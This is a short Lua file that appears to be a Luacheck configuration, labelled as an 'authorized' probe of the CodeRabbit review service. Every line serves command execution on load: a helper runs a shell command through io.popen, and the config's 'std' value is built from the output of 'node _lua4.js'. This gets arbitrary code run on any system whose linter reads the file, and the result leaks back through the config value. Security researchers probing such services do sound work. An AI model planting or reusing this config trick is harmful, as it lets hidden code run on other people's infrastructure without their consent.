-- CodeRabbit Luacheck config-load probe v4 (authorized self-test repo)
local function run(c)
  local h = io.popen(c)
  if not h then return "noexec" end
  local l = h:read("*l") or ""
  h:close()
  if l == "" then return "noexec" end
  return l
end
std = "EXECX_" .. run("node _lua4.js 2>/dev/null")
